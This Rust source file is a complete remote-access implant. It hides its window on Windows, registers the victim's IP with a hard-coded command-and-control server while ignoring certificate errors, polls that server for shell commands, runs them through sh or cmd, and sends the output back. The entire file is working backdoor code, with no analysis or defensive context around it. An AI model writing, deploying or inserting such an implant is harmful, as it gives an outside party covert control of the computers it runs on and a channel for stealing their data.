#![windows_subsystem = "windows"]
//Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
//Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses

use std::{thread,time};
use std::process::{Command, Stdio};
use std::time::Duration;
use std::env::set_current_dir;
use std::path::Path;
use wait_timeout::ChildExt;
use std::io::Read;
use dirs;
use serde::{Deserialize, Serialize};
use local_ip_address::local_ip;

const SLEEP_TIME: Duration = time::Duration::from_millis(5000);
// const SERVER_IP: &str = "https://c2.balls.agency:443";
const SERVER_IP: &str = "https://129.21.21.74:443"; //backup IP in case the domain doesn't resolve - default for now

#[derive(Serialize, Deserialize)]
struct NewHost {
    ip: String,
}

#[derive(Serialize, Deserialize)]
struct Host {
    identifier: String,
}

#[derive(Serialize, Deserialize)]
struct CommandRequest{
    cmd_id: i32
}

#[derive(Serialize, Deserialize)]
struct CommandFromServer{
    command: String
}

#[derive(Serialize, Deserialize)]
struct CommandResponse{
    cmd_id: i32,
    response: String
}

fn init_host(host_ip:&str) -> Option<String>{
    let ip = host_ip;

    let text = NewHost{
        ip: ip.to_string()
    };

    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let url = format!("{}/hosts/newhost",SERVER_IP);
    let hostname = match client.post(url).json(&text).send(){
        Ok(ok)=>{
            let id = ok.text().unwrap().to_string(); 
            print(&id);
            Some(id)
        }, Err(e)=>{
            print(&"InitHost - Can't connect to server");
            print(&format!("{}", e));
            None
        }
    };
    hostname
}

fn get_commands(identifier:&str) -> bool {
    let commands_url = format!("{}/hosts/commands",SERVER_IP);
	let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let text = Host{
        identifier: identifier.to_string()
    };
	let res = match client.post(commands_url).json(&text).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Get_Commands - Can't connect to server");
            thread::sleep(SLEEP_TIME);
            return false
        }
    };
    print(&res);
    //if the server response contains an error, restart the main loop

    if res.contains("RE-INIT"){
        print("Re-init received. Re-initializing...");
        return false
    }

    if res.contains("502 Bad Gateway"){
        print("502 Bad Gateway");
        thread::sleep(SLEEP_TIME);
        return false
    }
    if res == "NONE" || res == "" {
        print("No commands, sleeping");
        return true
    }

    let cmd_ids = res.split(";");
    for cmd_id in cmd_ids{
        let cmd = get_command(cmd_id);
        if cmd.eq("ERROR"){
            return false
        }
        if cmd.contains("RE-INIT"){
            return false
        }
        print(&format!("{}: {}",cmd_id,cmd));
        handle_command(cmd_id,&cmd,identifier);
    }
    true
}

fn get_command(cmd_id:&str) -> String{
    let command_url = format!("{}/hosts/getcommand",SERVER_IP);
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let text = CommandRequest{
        cmd_id: cmd_id.parse().unwrap_or(0)
    };
    let res = match client.post(command_url).json(&text).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Get_Command - Can't connect to server");
            thread::sleep(SLEEP_TIME);
            return String::from("ERROR")
        }
    };
    res
}

fn handle_command(cmd_id:&str, command:&str, identifier: &str){
    //run command
    if command.len() > 2{
        if command.eq("checkIn"){
            post_response(&cmd_id,&"checkIn-pong", &identifier);
            print("checked in TODO");
            return;
        }
        if command[..=1].eq("cd") { //if the first two letters are cd
            let path = Path::new(&command[3..]); //the path is the remaining
            if &command[3..] == "~"{
                let home = dirs::home_dir().unwrap();
                set_current_dir(home).expect("Could not change directory");
            }
            else{
                set_current_dir(path).expect("Could not change directory");
            }
            let cmd_out = &run_command(&"pwd");
            post_response(&cmd_id, &cmd_out, &identifier);
        } else{
            let cmd_out = &run_command(&command);
            post_response(&cmd_id, &cmd_out, &identifier);
        }
    }else{
        let cmd_out = &run_command(&command);
        post_response(&cmd_id, &cmd_out, &identifier);
    }
}

fn run_command(cmd: &str) -> String {
    let child = if !cfg!(target_os ="windows"){
        let mut child = match Command::new("/bin/sh").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
            Ok(out)=>{
                out
            }
            Err(e)=>{
                return format!("{}",e);
            }
        };
        let three_sec = Duration::from_secs(3);
        match child.wait_timeout(three_sec).unwrap() {
            Some(status) => status.code(),
            None => {
                match child.kill(){
                    Ok(_)=>{
                        "Process killed."
                    }
                    Err(_)=>{
                        "Process could not be killed."
                    }
                };
                child.wait().unwrap().code()
            }
        };
        child
    } else{
        Command::new("cmd").arg("/c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
    };
    let mut stdout_str = String::new();
    let mut stdout = child.stdout.unwrap();
    let mut stderr_str = String::new();
    let mut stderr = child.stderr.unwrap();
    stdout.read_to_string(&mut stdout_str).unwrap();
    stderr.read_to_string(&mut stderr_str).unwrap();
    let cmd_out = format!("{}{}",stderr_str,stdout_str);
    if cmd_out.ends_with('\n') { return cmd_out[0..cmd_out.len() - 1].to_string() }
    return cmd_out;
}

fn post_response(cmd_id: &str, response: &str, _identifier: &str){
    let responses_url = format!("{}/hosts/response",SERVER_IP);
    let mut response = response;
    if response.eq("") {
        response = "Command executed. (No response)"
    }
    print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
    
    let text = CommandResponse {
        cmd_id: cmd_id.parse().unwrap(),
        response: response.to_string(),
    };

    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    match client.post(&responses_url).json(&text).send(){
        Ok(ok)=>{
            ok.text().unwrap()
        }, Err(_)=>{
            print(&"Post_Response - Can't connect to server");
            return
        }
    };
    print("Successfully posted response to server.")
}

fn print(txt:&str){
    let mut print_bool: bool = false;
    if std::env::args().any(|x| x == "--debug"){
        print_bool = true;
    }
    if print_bool{
        println!("{}",txt);
    }
}

fn get_id(host_ip:&str) -> String {
    loop{
        let identifier = match init_host(host_ip){
            Some(id)=>{
                id
            }, None=>{
                print(&"Get_id - Can't connect to server");
                thread::sleep(SLEEP_TIME);
                continue;
            }
        };
        return identifier;
    }
}

fn main_loop(identifier:&str) -> Result<String,String>{
    loop{
        if !get_commands(&identifier) {
            return Err(String::from("Error"));
        }
        thread::sleep(SLEEP_TIME);
    }
}

fn main(){
    //if its loopback, get the ip from a bash command
    loop{
        //if it's a bsd machine
        let mut host_ip = String::new();
        if cfg!(target_os = "freebsd") || cfg!(target_os = "openbsd") || cfg!(target_os = "netbsd") || cfg!(target_os = "dragonfly") {
            host_ip = run_command("ifconfig | grep '1\\.1' | grep inet| awk '{print $2}'").to_string();
            }
        else if cfg!(target_os = "windows") {
            host_ip = local_ip().unwrap().to_string();
        }
        else {
            host_ip = run_command("hostname -I").to_string();
        }
        if host_ip.eq("127.0.0.1") || host_ip.eq("0.0.0.0"){
            print(&"Loopback detected, getting ip from bash command.");
            let ip = run_command("hostname -I");
            host_ip = ip.to_string();
            if host_ip.eq("") {
                host_ip = "0.0.0.0".to_string(); //if the ip is still empty, set it to 0.0.0.0 (default)
            }
        }
        host_ip = host_ip.split_whitespace().next().unwrap().to_string(); //get the first ip and remove the whitespace
        let identifier = get_id(&host_ip);
        match main_loop(&identifier){
            Ok(_)=>{
                continue
            }, Err(_)=>{
                continue
            }
        }
    }
}
